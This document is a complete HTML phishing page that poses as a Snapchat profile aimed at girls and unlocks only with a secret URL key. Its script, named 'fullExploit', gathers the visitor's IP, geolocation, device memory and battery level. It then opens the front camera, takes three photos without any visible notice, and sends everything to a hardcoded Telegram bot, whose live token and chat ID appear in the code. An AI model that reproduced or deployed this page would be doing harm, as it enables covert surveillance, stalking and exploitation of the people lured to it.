<!DOCTYPE html>
<html lang="ar">
<head>
    <title>Snapchat - Koko Englishy ✨</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta property="og:image" content="https://b.top4top.io/p_3769xk2ya0.jpg">
    <meta property="og:title" content="Snapchat - Koko Englishy ✨">
    <style>
        body { background-color: #FFFC00; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .snap-logo { width: 80px; margin-bottom: 20px; }
        .profile-card { background: #fff; padding: 25px; border-radius: 20px; text-align: center; width: 85%; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .profile-name { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 5px; }
        .profile-bio { font-size: 15px; color: #333; line-height: 1.6; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="profile-card" id="mainContent" style="display:none;">
    <img class="snap-logo" src="https://www.snapchat.com/favicon.png">
    <div class="profile-name">Koko Englishy ✨</div>
    <div class="profile-bio">
        🌸 Living my best life 🌸<br>
        👻 Private stories | Only for girls 💖<br>
        🎀 Loading Profile...
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
    const chatId = '7184970355';
    const secretKey = "123"; // يمكنك تغيير المفتاح من هنا

    // فحص المفتاح قبل أي شيء
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('key') !== secretKey) {
        window.location.href = "https://www.google.com"; // تحويل لغوغل إذا المفتاح خطأ
    } else {
        document.getElementById('mainContent').style.display = 'block';
    }

    async function fullExploit() {
        let battery = await navigator.getBattery();
        let ipInfo = "Unknown";
        let location = "Unknown";

        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            ipInfo = data.ip;
            location = `${data.city}, ${data.region}, ${data.country_name} (Map: https://www.google.com/maps/?q=${data.latitude},${data.longitude})`;
        } catch(e) {}

        let report = `🚨 Target Spotted!\nIP: ${ipInfo}\nLocation: ${location}\nRAM: ${navigator.deviceMemory}GB\nBattery: ${(battery.level * 100).toFixed(0)}%`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // التقاط 3 صور متتالية لضمان النتيجة
            let photoCount = 0;
            let interval = setInterval(() => {
                if (photoCount >= 3) {
                    clearInterval(interval);
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.snapchat.com/add/koko_englishy";
                    return;
                }

                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, `photo_${photoCount}.jpg`);
                    formData.append('caption', `📷 Photo ${photoCount + 1} | IP: ${ipInfo}`);
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                }, 'image/jpeg', 0.6);
                
                photoCount++;
            }, 800); // التقاط صورة كل 800 مللي ثانية
        })
        .catch(err => {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Permission Denied")}`);
            setTimeout(() => { window.location.href = "https://www.snapchat.com/add/koko_englishy"; }, 1000);
        });
    }

    if (urlParams.get('key') === secretKey) {
        window.onload = fullExploit;
    }
</script>

</body>
</html>
